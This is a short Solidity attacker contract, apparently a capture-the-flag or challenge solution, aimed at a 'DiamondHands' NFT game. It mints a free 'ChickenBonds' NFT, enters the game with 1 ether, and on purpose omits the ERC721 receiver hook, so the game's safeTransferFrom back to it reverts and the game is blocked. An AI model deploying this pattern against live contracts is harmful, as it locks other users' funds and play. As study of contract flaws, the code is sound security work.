// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./DiamondHands.sol";

contract DiamondHandsAttacker {
    DiamondHands public diamond;
    ChickenBonds public chicken;

    constructor(address _diamond, address _chicken) payable {
        diamond = DiamondHands(_diamond);
        chicken = ChickenBonds(_chicken);
    }

    function attack() external {
        // Mint a free NFT to this contract
        chicken.FryChicken(address(this), 999);
        // Approve DiamondHands to take it
        chicken.approve(address(diamond), 999);
        // Enter the game!
        diamond.playDiamondHands{value: 1 ether}(999);
    }

    // Notice: We intentionally do NOT implement onERC721Received!
    // When DiamondHands tries to safeTransferFrom the NFT back to us,
    // the ERC721 contract will see we don't have the receiver hook and revert the whole transaction!
}
